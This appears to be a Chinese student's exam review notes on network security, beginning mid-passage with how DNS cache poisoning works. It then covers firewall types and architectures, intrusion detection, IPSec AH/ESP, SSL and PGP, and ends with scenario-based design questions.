<p>DNS是域名解析协议，用于<strong>将域名解析成IP地址。</strong></p>
<p>原理：（1）DNS只使用<strong>序列号</strong>来进行有效性鉴别，有序列号攻击的风险。</p>
<p>（2）DNS从协议上看，响应消息可以随意的附加信息，<strong>攻击者可以附加任何无关的信息</strong>，对信息的完整性造成威胁。</p>
<p>（3）<strong>DNS有缓存机制</strong>，当客户端或者服务端收到某个域名和IP地址的对应信息是，<strong>会放入缓存中，下次直接使用，也有攻击的风险。</strong></p>
<p>步骤：（1）<strong>拦截DNS查询</strong></p>
<p>攻击发起：<strong>攻击者监听网络流量，寻找DNS查询请求。</strong></p>
<p>拦截查询：攻击者可能通过中间人攻击或对DNS服务器的<strong>直接访问来拦截对特定域名的查询</strong>。</p>
<p>（2）<strong>发送伪造的DNS响应</strong></p>
<p>伪造响应：攻击者<strong>构造一个伪造的DNS响应数据包。</strong></p>
<p>篡改内容：在这个伪造的响应中，攻击者将目标域名的IP地址<strong>指向一个恶意IP，而不是合法IP。</strong></p>
<p>（3）缓存投毒</p>
<p>欺骗DNS服务器：如果攻击者发送的伪造响应到达了DNS服务器&#x2F;用户，<strong>目标可能会将这个错误的信息缓存起来。</strong></p>
<p>影响用户：之后，当其他用户查询相同的域名时，DNS服务器<strong>会返回这个错误的IP地址，导致用户被重定向到恶意网站。</strong></p>
<p><strong>13.防火墙的定义和满足的条件</strong></p>
<p>（1）防火墙是位于两个(或多个)网络间实施<strong>网间访问控制</strong>的一组组件的集合。</p>
<p>（2）它满足以下条件：所有进出<strong>被保护网络的通信必须通过防火墙</strong>；所有通过防火墙的通信<strong>必须经过安全策略的过滤或者防火墙的授权；</strong>防火墙自身<strong>应对渗透免疫</strong></p>
<p><strong>14.说说包过滤防火墙的相关规则和优缺点</strong></p>
<p><img src="/2025/12/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BB%88%E6%9E%81%E9%A2%84%E6%B5%8B/2ed69cd2-b195-45ad-aa9c-4591ca314a77.png" alt="image.png"></p>
<p>(1)包过滤防火墙<strong>对接收的每个数据包进行审查</strong>，以便确定<strong>其是否与某一条包过滤规则匹配</strong>，进而做允许、拒绝</p>
<p>(2)包过滤规则：过滤规则基于可以提供给针对<strong>基本信息(协议IP转发过程的包头信息, ip, 端口等)、协议具体信息、数据流向和接口信息</strong>进行判断进行判断。</p>
<p>(3)分为<strong>静态包过滤与动态包过滤</strong>两类。动态包过滤: 对外出数据包的身份做一个标记，<strong>对相同连接的进入的数据包也被允许通过</strong>，也就是说，<strong>它捕获了一个“连接”，</strong>而不是单个数据包头中的信息。</p>
<p>(4)优点: <strong>a.逻辑简单、成本低；b.对网络性能影响小，有较强的透明性</strong>；c.易于匹配<strong>大多数网络层、传输层数据包</strong>；d.它的工作与应用层无关，<strong>无需改动应用层。</strong>（速记：成本、性能、向下、向上）</p>
<p>(5)缺点：配置需要对IP、TCP、UDP、ICMP等协议有相当深入的理解；据以过滤判别的<strong>只有网络层和传输层</strong>的有限信息，因而各种安全要求不能得到充分满足；由于数据包的地址及端口号都在数据包的头部，<strong>不能彻底防止IP地址欺骗</strong>；<strong>允许外部客户和内部主机的直接连接</strong>；<strong>不提供用户鉴别机制</strong>。</p>
<p><strong>15.说说应用网关防火墙的相关规则和优缺点</strong></p>
<p><img src="/2025/12/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BB%88%E6%9E%81%E9%A2%84%E6%B5%8B/5ebd2f7a-2530-47cb-9489-bd33cde48565.png" alt="image.png"></p>
<p>（1）代理防火墙&#x2F;应用网关在应用层处理信息：应用代理可以<strong>对数据包的数据区进行分析</strong>，并以此判断数据是否允许通过。</p>
<p>（2）流程：<strong>对用户的身份进行验证</strong>。若为合法用户，则把请求转发给真正的内网主机，<strong>同时监控用户的操作，拒绝不合法的访问。</strong>当内部网络向外部网络申请服务时，<strong>代理服务器的工作过程刚好相反，执行数据包监控，再转发给外网主机。</strong></p>
<p>（3）优点：<strong>不允许内外网主机的直接连接</strong>, 隐藏内部IP, 日志更详细</p>
<p>（4）缺点：<strong>效率低, 需要针对每一种协议单独设置, 对用户不透明</strong></p>
<p><strong>16.说说状态检测防火墙的相关规则和优缺点</strong></p>
<p><img src="/2025/12/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BB%88%E6%9E%81%E9%A2%84%E6%B5%8B/feaafa68-15df-4bd4-a00a-5723ef9233c9.png" alt="image.png"></p>
<p>（1）概念：状态检测防火墙是在动态包过滤防火墙基础上，<strong>增加状态检测机制</strong>而形成的，具有<strong>连接的跟踪能力</strong>。</p>
<p>（2）状态检测可以结合<strong>前后数据包里的数据信息</strong>(IP报头+TCP报头+数据)进行综合分析决定是否允许该包通过。</p>
<p>（3）以TCP协议为例：状态检测机制关注的主要问题<strong>不再仅是SYN和ACK标志位，或者是来源端口和目标端口</strong>，还包括了<strong>序号、窗口大小等其它TCP协议信息。</strong></p>
<p>（4）优点：<strong>具备动态包过滤的所有优点，同时具有更高的安全性。</strong></p>
<p>（5）缺点：仅限于网络层与传输层, <strong>无法抵抗应用层的攻击</strong>；性能比动态包过滤稍差，因为检测更多内容。</p>
<p><strong>17.双重宿主主机体系有几个部分组成，详细描述各个部分的功能</strong></p>
<p><img src="/2025/12/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BB%88%E6%9E%81%E9%A2%84%E6%B5%8B/e9f277ef-2b81-4c0b-80da-f08a1a329b2c.png" alt="image.png"></p>
<p>（1）双重宿主主机体系是一台主机（双重宿主主机）<strong>拥有两个网络接口，一个连接到外部网络（如互联网），另一个连接到内部网络（如企业内部网）。</strong></p>
<p>（2）它位于<strong>内部网络和外部网络</strong>之间，充当与这些接口相连的网络之间的路由器，能够从一个网络接收IP数据包并将之发往另一网络。</p>
<p>（3）双重宿主主机的防火墙体系结构<strong>禁止内网直接发送功能</strong>，完全<strong>阻止了内外网络之间的IP通信</strong></p>
<p>（4）双重宿主主机的特性:<strong>安全至关重要(唯一通道)，其用户口令控制安全是关键；必须支持很多用户的访问（中转站）</strong>，其性能非常重要</p>
<p>（5）缺点：双重宿主主机是隔开内外网络的<strong>唯一屏障</strong>，一旦它被入侵，内部网络便向入侵者敞开大门</p>
<p><strong>18.屏蔽主机体系结构有几个部分组成，详细描述各个部分的功能</strong></p>
<p><img src="/2025/12/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BB%88%E6%9E%81%E9%A2%84%E6%B5%8B/image%205.png" alt="image.png"></p>
<p>（1）组成：屏蔽主机体系结构<strong>由防火墙和内部网络的堡垒主机</strong>承担安全责任。其中一般防火墙就是简单的<strong>包过滤路由器</strong>。</p>
<p>（2）经典结构：<strong>包过滤路由器+堡垒主机</strong></p>
<p>（3）包过滤路由器: <strong>在内部网和外部网之间</strong>，保证外部系统对内部网络的操作只能经过堡垒主机。</p>
<p>堡垒主机：<strong>配置在内部网络上</strong>，是外部网络主机连接到内部网络主机的桥梁，它需要拥有高等级的安全</p>
<p>（4）配置规则：允许内部主机<strong>为了某些服务请求与外部网上的主机建立直接连接</strong>（即允许那些经过过滤的服务）。不允许所有来自外部主机的直接连接，而是需要经过堡垒主机。</p>
<p>（5）优点：<strong>安全性更高，双重保护；</strong>实现了网络层安全（包过滤）和应用层安全(代理服务)，不允许外界主机直接连接</p>
<p>（6）缺点：<strong>过滤路由器能否正确配置</strong>是安全与否的关键。如果路由器被损害，堡垒主机将被穿过。</p>
<p><strong>19.屏蔽子网体系结构防火墙有几个部分组成，详细描述各个部分的功能</strong></p>
<p><img src="/2025/12/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BB%88%E6%9E%81%E9%A2%84%E6%B5%8B/image%206.png" alt="image.png"></p>
<p>（1）由<strong>外部路由器、周边网络、堡垒主机、内部路由器、内部网络组成</strong></p>
<p>（2）外部路由器：保护<strong>周边网络和内部网络</strong>不受外部网络的侵犯</p>
<p>周边网络：作为一个防护层、可以运行一些信息系统，在其上可放置一些信息服务器，它们是牺牲主机，可能会受到攻击。<strong>在受到侵犯时仍能消除对内部网络的监听。</strong></p>
<p>堡垒主机：<strong>位于周边网络，是整个防御系统的核心</strong>；可被认为是<strong>应用层网关</strong>，可以运行各种代理服务程序；出站服务不一定要求经过堡垒主机，但所有入站服务都要经过堡垒主机。</p>
<p>内部路由器：保护<strong>内部网络不受周边网络和外部网络的侵犯</strong>，执行大部分的过滤工作。</p>
<p>内部网络：重要的数据所在，存放机密数据。</p>
<p>（3）优点：需要<strong>攻破3个不同的设备</strong>才能进入内部网络；<strong>只对外通告非军事区</strong>，保证内部网络不可见；内部网络用户通过<strong>堡垒主机或代理服务器</strong>访问外部网络。</p>
<p><strong>20.基于主机系统结构？优缺点？</strong></p>
<p>（1）检测的目标：主要是<strong>主机系统和系统本地用户</strong>。</p>
<p>（2）检测原理：是根据<strong>主机的审计数据和系统的日志</strong>发现可疑事件，检测系统可以运行在被检测的主机或单独的主机上。</p>
<p>（3）优点: 审计内容全面，视野集中，适用于加密及交换环境。</p>
<p>（4）缺点: 影响服务器性能，<strong>依赖审计数据或系统日志</strong>的准确性和完整性，不能监控网络上的情况。</p>
<p><strong>21.基于网络系统结构？优缺点？</strong></p>
<p>（1）根据<strong>网络流量、协议分析、单台或多台主机的审计数据</strong>检测入侵。</p>
<p>（2）优点：服务器平台独立性，配置简单，监视多种攻击</p>
<p>（3）缺点：不能检测不同网段的网络包，<strong>难以应付需要大量计算的复杂攻击</strong>，难以处理加密对话，协同工作能力弱</p>
<p><strong>22.基于异常的IDS的定义？检测原理？优缺点？</strong></p>
<p>（1）定义：任何正常用户的行为都有一定的规律，而入侵会导致用户或者系统行为的异常。<strong>首先要总结出正常的用户行为轮廓，当用户行为严重偏离正常行为时则认为是入侵</strong></p>
<p>（2）原理：<strong>首先总结正常行为的轮廓；检测系统目前的行为；查看是否超出预先定义的门限</strong></p>
<p>（3）优点：<strong>能检测出未知的行为；能检测出冒用账号的行为；具有自适应和自学习的能力；不需要系统先验知识</strong></p>
<p>（4）缺点：<strong>漏报率低，误报率相对较高；计算量大</strong>，耗用系统资源；<strong>统计点的选取和参考库的建立</strong>比较难</p>
<p><strong>23.snort使用哪种检测技术？检测技术的原理是什么？什么优缺点？</strong></p>
<p><img src="/2025/12/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BB%88%E6%9E%81%E9%A2%84%E6%B5%8B/076c6f1b-b894-44bc-a688-671b7ce3d131.png" alt="image.png"></p>
<p><strong>误用检测技术</strong></p>
<p>（1）原理：首先要对入侵行为的<strong>特征、环境、次序、完成事件的关系</strong>进行描述，通过<strong>某种方式预先定义入侵行为，然后监视系统</strong>，符合预先定义的入侵行为则认为是入侵。</p>
<p>（2）优点：<strong>算法简单，开销小，准确率高，效率高。</strong></p>
<p>缺点：只能<strong>检测出预先定义的行为</strong>，无法检测出新类型的攻击方式的威胁</p>
<p><strong>建立模式库困难</strong>：模式库需要更新，依赖于硬件平台，操作系统和系统中运行的应用软件。</p>
<p><strong>专家系统（if-then）、模型推理（结合攻击脚本）、完整性分析</strong></p>
<p><strong>24.IPSecVPN中AH协议的功能，AH协议有哪两种模式？分析这两种模式的差异</strong></p>
<p>（1）功能：<strong>身份认证、数据完整性校验、重放攻击保护</strong></p>
<p>（2）模式：<strong>传输模式、隧道模式</strong></p>
<p>（3）差异：传输模式在原来的IP头和载荷之间加入AH头；隧道模式在原IP和载荷之前加入AH头，再在AH头之前加一个新IP头</p>
<p><img src="/2025/12/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BB%88%E6%9E%81%E9%A2%84%E6%B5%8B/512224c9-bd4a-437f-bb5e-5271814ff75e.png" alt="image.png"></p>
<p><strong>25.IPSec VPN中ESP协议的功能，AH协议有哪两种模式？分析这两种模式的差异</strong></p>
<p><img src="/2025/12/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BB%88%E6%9E%81%E9%A2%84%E6%B5%8B/b4167c80-c64b-4260-97f8-c346b4650d6a.png" alt="image.png"></p>
<p>（1）ESP功能：身份认证、<strong>加密数据、</strong>数据完整性校验、重放攻击保护</p>
<p>（2）模式：<strong>传输模式、隧道模式</strong></p>
<p>（3）差异：传输模式在载荷和IP头之间加入esp头，载荷之后加入esp尾，在esp尾加入esp认证；隧道模式在IP头之前加入esp头，载荷之后加入esp尾，在esp尾之后加入esp认证，在最前面加入新IP头</p>
<p><strong>26.AH和ESP总结</strong></p>
<p>（1）相同点：<strong>AH和ESP都可以在隧道模式和传输模式下运作</strong>；隧道模式<strong>都会多一个新IP头</strong></p>
<p>（2）不同点</p>
<p>加密功能：<strong>AH不提供加密功能，只提供数据完整性和源认证</strong>。<strong>ESP提供数据加密服务，保证数据保密性</strong>，同时<strong>也提供数据完整性和源认证。</strong></p>
<p>协议头部：<strong>AH包含一个特定的AH头，用于存储认证信息</strong>。ESP<strong>包含一个ESP头和一个可选的ESP尾部</strong>，用于支持加密和可选的认证。</p>
<p><strong>27.简要说明传输模式和隧道模式的区别</strong></p>
<p>传输模式：主机——主机：<strong>更适合端到端加</strong>密，只保护<strong>数据包的有效载荷部分</strong>，而不保护IP头信息。</p>
<p>隧道模式：网关——网关：<strong>适用于VPN等场景</strong>，<strong>保护整个数据包</strong>，<strong>包括IP头部和有效载荷</strong>，更适合于网关间的加密通信。</p>
<p>区别：传输模式主要用于保护端到端的通信，而隧道模式则用于保护通过不安全网络传输的整个IP数据包。隧道模式提供了更高级别的安全性，因为它隐藏了原始IP数据包的所有信息</p>
<p><strong>28.只有ESP而没有AH不行</strong></p>
<p>ESP的认证数据<strong>包括ESP头、负载、ESP尾，但是不包括IP头</strong>。而AH的认证<strong>包括IP头部、AH头部，以及AH封装的整个payload</strong>。因此为了对IP头进行完整性保护，而且需要<strong>数据加密</strong>，那么同时使用AH和ESP将是必要的。</p>
<p><strong>29.安全关联SA是什么？</strong></p>
<p>SA是两个IPSec通信实体之间<strong>经协商建立起来的一种共同协定</strong>，它规定了通信双方<strong>使用哪种IPSec协议保护数据安全、应用的算法标识、加密和验证的密钥取值以及密钥的生存周期</strong>等安全属性值。</p>
<p><strong>30.SSL有哪些主要协议？详细描述SSL数据封装的过程</strong></p>
<p><strong>（1）下层：SSL记录协议；高层：SSL握手协议、SSL密码变化协议、SSL警告协议</strong></p>
<p><strong>（2）数据封装：分片：把数据进行分片，一般214字节，也可以更小；压缩：无损压缩；计算MAC：计算消息鉴别码；加密：采用CBC加密</strong></p>
<p><strong>31.SSL全称及其功能？</strong></p>
<p>（1）全称：<strong>SSL安全套接字层</strong></p>
<p>（2）功能：<strong>为TCP协议</strong>提出一个<strong>可靠的端到端服务</strong>为两个通讯个体之间<strong>提供保密性和完整性</strong>（身份认证）</p>
<p><strong>32.SSL连接与会话的概念？区别？</strong></p>
<p>（1）<strong>一个连接是一个提供一种合适类型服务的传输。</strong></p>
<p>（2）SSL连接是点对点的关系：<strong>连接是暂时的，每一个连接于一个会话对应。</strong></p>
<p>（3）<strong>一个SSL会话是在客户与服务器之间的一个关联</strong>。表示一组共享的<strong>安全参数和状态信息</strong>。</p>
<p>（4）会话<strong>由SSL握手协议创建</strong>，定义了<strong>一组可供多个连接共享的加密安全参数</strong>。节约交互资源，方便后续建立SSL连接。</p>
<p>区别：</p>
<p>（1）<strong>持久性：</strong>会话可以跨越多个连接，即使单个连接关闭了，会话仍然可以存在。而连接是暂时的，通常在数据传输完成后关闭。</p>
<p>（2）<strong>作用范围：</strong>连接是实际的数据传输通道，负责在两端实体之间传输加密的数据流。会话是一个安全参数的集合，它定义了如何进行加密和身份验证，但本身不传输数据。</p>
<p>（3）<strong>性能优化：</strong>会话的概念允许多个连接复用相同的安全参数，从而减少了握手次数，提高了性能。SSL会话会协商出一个会话密钥，每一次SSL连接使用会话密钥一个生成的连接密钥。</p>
<p><strong>33.SSL握手协议整体流程</strong></p>
<p>（1）<strong>交换Hello消息</strong>，对于<strong>算法、交换随机值</strong>等协商一致</p>
<p>（2）交换必要的<strong>密码参数</strong>，以便双方得到<strong>统一的预主密钥</strong></p>
<p>（3）交换<strong>证书和相应的密码信息</strong>，以便进行<strong>身份认证</strong></p>
<p>（4）<strong>产生主密钥</strong></p>
<p>（5）把<strong>安全参数</strong>提供给<strong>TLS记录层</strong></p>
<p>（6）检验双方是否已经获得<strong>同样的安全参数</strong></p>
<p><strong>34.SSL密码变化协议的内容</strong></p>
<p>（1）协议只包含一条消息，一个字节1：<strong>这条唯一的消息只包含一个字节的数据</strong>。在SSL&#x2F;TLS的上下文中，这个字节的值被设定为1。这个值用于标识该消息是Change Cipher Spec消息。</p>
<p>（2）用途：<strong>切换状态，把密码参数设置为当前状态</strong>；在握手协议中，<strong>当安全参数协商一致后</strong>，发送此消息。</p>
<p>（3）当SSL握手过程即将完成时，客户端和服务器都会发送一个“Change Cipher Spec”消息。这个消息是一个简单的信号，<strong>表示接下来的通信将使用新协商的加密参数</strong>（如加密算法、密钥、MAC算法等）进行。</p>
<p><strong>35.SSL警告协议的内容</strong></p>
<p>（1）协议数据包含两个字节：<strong>第一个字节为level，分别为warning(1)和fatal(2)两种情况；第二个字节为情况说明</strong></p>
<p>（2）当发生Fatal警报时，<strong>相关的会话标识符被标记为无效</strong>。这意味着尽管其他连接（如同一客户端与服务器间的其他会话）可能继续运作，但是因为出现严重错误的那个会话的标识符变得无效，这个特定会话不能被用来快速恢复或建立新的连接。</p>
<p><strong>36.说说PGP身份认证过程，简单描述处理顺序</strong></p>
<p>（1）<strong>发送者创建报文</strong>, 使用SHA-1生成报文的<strong>160位散列码</strong></p>
<p>（2）<strong>用发送者的私有密钥，用RSA算法对散列码签名</strong>，并置在报文前面。注意: RSA指签名散列码</p>
<p>（3）接收者<strong>使用发送者的公开密钥，用RSA恢复散列码</strong></p>
<p>（4）接收者计算报文的散列码，<strong>与解密得到的进行比较</strong>，如果两者匹配，则报文通过鉴别</p>
<p>（5）签名<strong>也可以使用DSS&#x2F;SHA-1来生成</strong>，PGP也支持分离的数字签名</p>
<p><img src="/2025/12/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BB%88%E6%9E%81%E9%A2%84%E6%B5%8B/733f6473-b789-45f6-9afd-fc558e27aa54.png" alt="image.png"></p>
<p><strong>37.PGP邮件加密的处理过程</strong></p>
<p>（1）发送者<strong>生成报文和128为会话密钥随机数</strong></p>
<p>（2）采用<strong>CAST-128</strong>(或IDEA或3DES)对<strong>报文加密</strong></p>
<p>（3）<strong>用接收者的公钥RSA加密会话密钥</strong></p>
<p>（4）<strong>接收者先用私钥解密, 获得会话密钥, 再解密报文</strong></p>
<p><img src="/2025/12/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BB%88%E6%9E%81%E9%A2%84%E6%B5%8B/6cbe6f9a-3038-436b-bd2f-8793558922c0.png" alt="image.png"></p>
<p><strong>对称加密算法和公钥加密算法</strong>的结合可以缩短加密时间，用<strong>公钥算法解决了会话密钥的单向分发问题</strong>。每个消息都有自己的<strong>一次性密钥</strong>，进一步<strong>增加了保密的强度</strong>。</p>
<p><strong>38.PGP认证和加密都需要的过程</strong></p>
<p>两种服务(身份认证和邮件加密)都需要时，<strong>发送者先用自己的私钥签名散列值，然后用会话密钥加密消息</strong>，再用<strong>接收者的公钥加密会话密钥。</strong></p>
<p>这里公钥加密采用RSA；对称加密采用CAST-128(或IDEA或3DES), 所以用128比特密钥。</p>
<p><img src="/2025/12/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BB%88%E6%9E%81%E9%A2%84%E6%B5%8B/5696668c-a770-4427-a04b-3c23b47a5274.png" alt="image.png"></p>
<p><strong>39.压缩为什么要放在加密之前？签名后压缩的原因</strong></p>
<p>（1）顺序：<strong>签名、压缩、加密</strong></p>
<p>（2）压缩对<strong>邮件传输或存储</strong>都有<strong>节省空间</strong>的好处。</p>
<p>（3）压缩在加密前：<strong>不需要为检验签名而保留压缩版本的消息；为了检验而再做压缩不能保证一致性，压缩算法的不同实现版本可能会产生不同的结果。</strong></p>
<p>（4）压缩后再加密的原因：<strong>压缩后的消息其冗余小，增加密码分析的难度。若先加密，则压缩难以见效。</strong></p>
<p><strong>40.发送方和接收方如何处理数据</strong></p>
<p>发送方：</p>
<p>（1）签名：<strong>从私钥环中得到私钥，利用userid作为索引</strong>；PGP提示<strong>输入口令短语，恢复私钥</strong>；构造签名部分</p>
<p>（2）加密：PGP<strong>产生一个会话密钥，并加密消息</strong>；PGP<strong>用接收者userid从公钥环中获取其公钥</strong>；构造消息的会话密钥部分</p>
<p>发送方userid获取公私钥</p>
<p>接收方：</p>
<p>（1）解密消息：PGP用消息的<strong>会话密钥部分中的KeyID作为索引</strong>，从私钥环中获取私钥</p>
<p>PGP提示<strong>输入口令短语</strong>，恢复私钥</p>
<p>PGP<strong>恢复会话密钥</strong>，并解密消息</p>
<p>（2）验证消息：PGP用消息的<strong>签名部分中的KeyID作为索引</strong>，从公钥环中获取发送者的公钥</p>
<p>PGP恢复被传输过来的<strong>消息摘要</strong></p>
<p>PGP<strong>对于接收到的消息作摘要</strong>，并与上一步的结果作比较</p>
<h1 id="情景扩展题"><a href="#情景扩展题" class="headerlink" title="情景扩展题"></a>情景扩展题</h1><p><strong>1.社工攻击原理</strong></p>
<p>社工模型：**(1)确定攻击对象(2)收集信息(3)攻击准备(4)建立信任关系(5)利用信任关系(6)维护对象情绪**</p>
<p>防御：(1)人员安全工程：保护个人资料不外泄；时刻提高警惕；保持理性思维；不要随意丢弃废物<br>(2)网络钓鱼防御：钓鱼网站检测与防御：基于黑、白名单的钓鱼网站检测；基于网站特征的启发式钓鱼网站检测<br>钓鱼邮件检测：基于邮件特征的启发式检测</p>
<p>设计题：电信诈骗、移动互联网</p>
<p>安全问题：<strong>隐私泄露、钓鱼网站、骚扰电话短信、病毒、诈骗</strong></p>
<p>物联网安全问题：<strong>物理设备安全、数据安全、隐私安全、通信安全、病毒</strong></p>
<p><strong>2.移动互联网已经成为当前人们应用最广泛的网络形态之一，移动互联网的安全问题也是大家关注的重点，大量的相关安全案件也说明其是攻击的重要目标，请尝试分析下述问题并给出答案：</strong></p>
<ul>
<li><strong>请列举当前移动互联网存在的主要安全问题（不少于3种）；</strong></li>
</ul>
<p>当前移动互联网存在的主要安全问题：<br>（1）个人隐私泄露；（2）钓鱼网站；（3）骚扰电话、短信、垃圾邮件；（4）互联网病毒的传播；（5）集成度高的移动智能终端设备受攻击后难以恢复等等。</p>
<ul>
<li><strong>请列举你了解的移动互联网的安全措施和技术（不少于3种）；</strong></li>
</ul>
<p>移动互联网的安全措施和技术：<br>（1）国家实施网络安全法，普及网络安全知识，净化网络环境；<br>（2）杀毒软件对恶意软件的检测、垃圾邮件过滤功能、骚扰电话短信过滤功能；<br>（3）移动互联网文件访问控制，应用隐私权限白名单；<br>（4）移动签名服务、移动身份认证技术等等；</p>
<ul>
<li><strong>说出你针对当前问题的解决方案。</strong></li>
</ul>
<p>（1）首先从大的方面讲，国家和相关网络公司要投资建立专业的、系统的、相对安全的移动互联网体系，净化网络环境，提高网民的安全度；<br>（2）落实到个人，目前大多数的病毒传播以及网络攻击是由于个人网络安全意识匮乏，所以鼓励网民了解网络诈骗攻击的手段、提高网络保护意识、做好个人安全防护，可以很大程度解决当前移动互联网的安全问题；<br>（3）对于移动互联网，主要要解决移动设备的安全，比如设置好移动设备密码、传输加密、敏感操作进行身份认证、软件系统及时更新、启用白名单、支持远程禁用设备等等。</p>
<p>3.防火墙能实现哪些安全任务？</p>
<p><strong>集中化的安全管理，强化安全策略：</strong>由于Internet上每天都有上百万人在那里收集信息、交换信息，不可避免地会出现个别品德不良的人，或违反规则的人，防火墙是为了防止不良现象发生的“交通警察”，它执行站点的安全策略，仅仅容许“认可的”和符合规则的请求通过。</p>
<p><strong>网络日志及使用统计：</strong>因为防火墙是所有进出信息必须通路，所以防火墙非常适用收集关于系统和网络使用和误用的信息。作为访问的唯一点，防火墙能在被保护的网络和外部网络之间进行记录，对网络存取访问进行和统计</p>
<p><strong>保护那些易受攻击的服务：</strong>防火墙能够用来隔开网络中一个网段与另一个网段。这样，能够防止影响一个网段的问题通过整个网络传播。</p>
<p><strong>增强的保密：</strong>用来封锁有关网点系统的DNS信息。因此，网点系统名字和IP地址都不要提供给Internet。</p>
<p><strong>实施安全策略：</strong>防火墙是一个安全策略的检查站，控制对特殊站点的访问。所有进出的信息都必须通过防火墙，防火墙便成为安全问题的检查点，使可疑的访问被拒绝于门外。</p>
<p><img src="/2025/12/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BB%88%E6%9E%81%E9%A2%84%E6%B5%8B/image%207.png" alt="image.png"></p>
<p>（1）利用所给资源：外部路由器，内部路由器，参数网络，堡垒主机设计一个防火墙并回答相关问题。</p>
<p>要求：将各资源连接构成防火墙。指出次防火墙属于防火墙体系结构中哪一种。说明防火墙各结构的主要作用</p>
<p><strong>A：防火墙的设计思想就是在内部、外部两个网络之间建立一个具有安全控制机制的安全控制点，通过允许、拒绝或重新定向经过防火墙的数据流，来实现对内部网服务和访问的安全审计和控制。需要指出的是，防火墙虽然可以在一定程度上保护内部网的安全，但内部网还应有其他的安全保护措施，这是防火墙所不能代替的。</strong></p>
<p><strong>B：属于防火墙体系结构中的屏蔽子网防火墙。</strong></p>
<p><strong>C：两个分组过滤路由器，一个位于周边网与内部的网络之间，另一个位于周边网与外部网络之间。</strong></p>
<p><strong>通过屏蔽子网防火墙访问内部网络要受到路由器过滤规则的保护。堡垒主机、信息服务器、调制解调器组以及其他公用服务器放在子网中。屏蔽子网中的主机是内部网和Internet都能访问唯一系统，他支持网络层和应用层安全功能。</strong></p>
<p>（2）防火墙的设计者和管理人员要致力于保护堡垒主机的安全，请说明在设计堡垒主机通常应遵循怎样的原则。</p>
<p><strong>①最简化原则：堡垒主机越简单，堡垒主机本身的安全越有保证。因为堡垒主机提供的任何服务都可能出现软件缺陷或配置错误，而且缺陷或错误都可能导致安全问题。因此，堡垒主机尽可能少些服务，它应当在完成其作用的前提下，提供它能提供的最小特权的最少的服务。</strong></p>
<p><strong>②预防原则：尽管用户尽了最大努力确保堡垒主机的安全，侵入仍可能发生。但只有预先考虑最坏的情况，并提出对策，才能可能避免它。万一堡垒主机受到侵袭，用户又不愿看到侵袭导致整个防火墙受到损害，可以通过不再让内部的机器信任堡垒主机来防止侵袭蔓延。</strong></p>
<p>（3）在设计和建造防火墙时，通常采取多种变化和组合，如果要在防火墙配置中使用多堡垒主机，是否可行？为什么？</p>
<p><strong>可行的，这样的做的理由是：如果一台堡垒主机失败了，服务可由另一台提供。</strong></p>
<p>（4）如果将堡垒主机与内部路由器合并，将会出现怎样的结果？</p>
<p><strong>将堡垒主机与内部路由器合并将损害网络的安全性。将这二者合并，其实已经从根本上改变了防火墙的结构。</strong></p>
<p>5.某市拟建立一个电子政务网络，需要连接本市各级政府机关（市、区、县等）及企事业单位，提供数据、语音、视频传输和交换的统一的网络平台，纳入电子政务平台的各单位既有横向（是本级政府的组成部门）的数据交互，又有纵向的行业部门的信息交互。从安全角度考虑，你认为该网络的设计应注意哪些问题？你的解决方案？</p>
<p><strong>物理安全、网络平台、系统的安全、应用的安全、管理的安全、黑客的攻击、不满的内部人员、病毒的攻击</strong></p>
<p>最常见的网络安全问题还是处于网络内部并且是内部底层。内网底层的安全常常被忽略，这就是现在的企业为什么花了钱买了安全设备但是内网的卡、慢、掉线依然存在的原因。最后一句话，想要内网安全，从内网底层做起！</p>
<p>建立完整的信息安全保障体系。该体系应包括：<strong>物理安全、网络安全、系统安全、应用安全、数据安全、灾难备份和恢复等</strong></p>
<p>6.某投资人士用Modem拨号上网，通过金融机构的网上银行系统，进行证券、基金和理财产品的网上交易，并需要用电子邮件与朋友交流投资策略。该用户面临的安全威胁主要有:</p>
<p>(1)计算机硬件设备的安全;(2)计算机病毒;(3)网络蠕虫;(4)恶意攻击；(5)木马程序;(6)网站恶意代码;(7)操作系统和应用软件漏洞;(8)电子邮件安全。试据此给出该用户的网络安全解决方案。</p>
<p><img src="/2025/12/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BB%88%E6%9E%81%E9%A2%84%E6%B5%8B/image%208.png" alt="image.png"></p>
<p>7.某局域网如下图，其中1号设备是路由器，4号设备是交换机，5和6号设备是DMZ区服务器，7、8和9号设备是个人计算机。</p>
<p><img src="/2025/12/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BB%88%E6%9E%81%E9%A2%84%E6%B5%8B/image%209.png" alt="image.png"></p>
<p>请回答下列问题:</p>
<p>(1)2和3号设备中，哪个设备是防火墙?哪个设备是交换机?</p>
<p>(2)3套个人防火墙软件最适合安装在哪3个设备上?(只能选3个设备)</p>
<p>(3)5套防病毒软件应该安装在哪5个设备上?(只能选5个设备)</p>
<p><img src="/2025/12/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BB%88%E6%9E%81%E9%A2%84%E6%B5%8B/image%2010.png" alt="image.png"></p>
<p>8.某电子商务企业的网络拓扑结构如题图所示，试分析该系统可能存在的典型的网络安全威胁。</p>
<p><img src="/2025/12/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BB%88%E6%9E%81%E9%A2%84%E6%B5%8B/image%2011.png" alt="image.png"></p>
<p>9.在内部网络与外部网络之间设计了一个屏蔽子网体系结构的防火墙，要求:</p>
<p>(1)在下面给出的防火墙结构图的括号中标注组件名称，并补充缺失的连线。</p>
<p>(2)简述防火墙结构图中各组件的基本功能。</p>
